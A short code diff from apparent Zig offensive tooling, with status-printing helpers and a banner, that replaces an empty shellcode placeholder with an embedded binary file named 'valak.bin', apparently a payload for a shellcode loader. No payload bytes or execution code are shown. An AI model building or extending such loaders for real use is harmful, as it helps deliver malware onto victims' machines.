@@ -13,9 +13,7 @@ fn ok(comptime fmt: []const u8, args: anytype) void { print("[+] " ++ fmt ++ "\n
 fn info(comptime fmt: []const u8, args: anytype) void { print("[*] " ++ fmt ++ "\n", args); }
 fn err(comptime fmt: []const u8, args: anytype) void { print("[-] " ++ fmt ++ "\n", args); }
 
-const shellcode = [_]u8{
-    // paste your shellcode bytes here
-};
+const shellcode = @embedFile("../valak.bin");
 
 fn banner() void {
     print(
